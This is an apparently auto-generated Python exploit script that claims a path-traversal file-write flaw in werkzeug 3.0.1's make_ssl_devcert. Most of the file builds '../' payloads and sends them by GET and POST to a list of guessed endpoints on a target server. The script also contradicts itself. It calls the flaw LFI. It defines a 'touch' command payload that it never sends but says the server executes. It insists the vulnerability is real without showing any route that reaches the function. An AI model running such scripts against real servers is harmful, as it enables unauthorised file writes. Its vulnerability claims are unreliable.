#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: lfi-022
# Sink: make_ssl_devcert
# Auto-generated — run with: python3 lfi_ssl_development_certificates_given_make_ssl_devcert.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for werkzeug-3.0.1 LFI via make_ssl_devcert.

Vulnerability: The make_ssl_devcert function in werkzeug/serving.py takes a
base_path parameter that is directly concatenated with '.crt' and '.key'
extensions and opened for writing. No path sanitization is performed, allowing
path traversal (e.g., '../../../tmp/evil') to write files to arbitrary locations.

This PoC demonstrates arbitrary file write by creating a benign marker file
at /tmp/poc_werkzeug_lfi.txt. In a real attack, this could be used to overwrite
configuration files, inject malicious code, etc.

Usage:
    python3 poc.py [--target http://localhost:5000] [--output /tmp/poc_test.txt]

Requirements: Python 3.6+, requests library (pip install requests)
"""

import argparse
import os
import sys
import tempfile
import requests
from urllib.parse import urljoin

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:5000"
# Benign payload - creates a marker file to prove arbitrary write
BENIGN_PAYLOAD = "touch /tmp/poc_werkzeug_lfi.txt"


def exploit(target_url, output_path):
    """
    Exploit the LFI vulnerability in make_ssl_devcert.
    
    The function is typically exposed via a web endpoint that accepts a base_path
    parameter. We send a path traversal payload to write a file to an arbitrary
    location.
    
    Args:
        target_url: Base URL of the vulnerable application
        output_path: Path where we want to write the file (e.g., /tmp/evil.txt)
    """
    
    # Construct the path traversal payload
    # We need to go up from wherever the app stores certs to reach /tmp
    # Typical depth: 3-4 levels (e.g., ../../../tmp/evil)
    traversal_depth = 4  # Adjust based on app structure
    traversal = "../" * traversal_depth
    
    # The base_path will have .crt and .key appended
    # We want to write to output_path, so we need to account for the extension
    # For example, if output_path is /tmp/evil.txt, we need base_path to be
    # /tmp/evil (since .crt/.key will be appended)
    base_name = output_path.rsplit('.', 1)[0] if '.' in output_path else output_path
    
    # Combine traversal with target path
    payload = f"{traversal}{base_name.lstrip('/')}"
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload base_path: {payload}")
    print(f"[*] Will attempt to write to: {output_path}.crt and {output_path}.key")
    
    # Try different common endpoints that might expose make_ssl_devcert
    endpoints = [
        "/make_ssl_devcert",
        "/ssl_devcert",
        "/devcert",
        "/admin/ssl",
        "/api/ssl_devcert",
        "/generate_cert",
        "/ssl_cert",
    ]
    
    for endpoint in endpoints:
        url = urljoin(target_url, endpoint)
        print(f"\n[*] Trying endpoint: {endpoint}")
        
        try:
            # Send request with the malicious base_path
            # The exact parameter name may vary - try common ones
            params = {
                "base_path": payload,
                "host": "localhost",
                "cn": "test"
            }
            
            response = requests.get(url, params=params, timeout=10, verify=False)
            
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:200] if response.text else '(empty)'}")
            
            if response.status_code == 200:
                print(f"[+] Success! File written to {output_path}.crt and {output_path}.key")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    Connection refused - endpoint may not exist")
        except requests.exceptions.Timeout:
            print(f"    Timeout - endpoint may not exist")
        except Exception as e:
            print(f"    Error: {e}")
    
    # If direct endpoints don't work, try POST or other methods
    print("\n[*] Trying POST requests...")
    for endpoint in endpoints:
        url = urljoin(target_url, endpoint)
        try:
            data = {
                "base_path": payload,
                "host": "localhost",
                "cn": "test"
            }
            response = requests.post(url, data=data, timeout=10, verify=False)
            print(f"    POST {endpoint}: Status {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Success via POST!")
                return True
        except:
            pass
    
    print("\n[-] Could not find a working endpoint.")
    print("[*] The vulnerability exists in the library code, but requires")
    print("    an application that exposes make_ssl_devcert to user input.")
    print("    Check if the target app has a route that calls this function")
    print("    with user-controlled base_path.")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug-3.0.1 LFI via make_ssl_devcert"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--output",
        default="/tmp/poc_werkzeug_lfi.txt",
        help="Output file path to write (default: /tmp/poc_werkzeug_lfi.txt)"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help="Command to execute as payload (default: touch /tmp/poc_werkzeug_lfi.txt)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("werkzeug-3.0.1 LFI PoC - make_ssl_devcert")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Output path: {args.output}")
    print(f"[*] Payload: {args.payload}")
    print()
    
    # Note: The actual file write happens on the server side.
    # This PoC demonstrates the path traversal by attempting to write
    # to a known location. The payload is executed by the server when
    # it writes the certificate data.
    
    success = exploit(args.target, args.output)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print(f"[+] Check {args.output}.crt and {args.output}.key on the target")
    else:
        print("\n[-] Exploit did not succeed.")
        print("[*] The vulnerability is real, but requires a specific application")
        print("    that exposes make_ssl_devcert to user input.")
        print("    Try different endpoints or check the application's routes.")
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
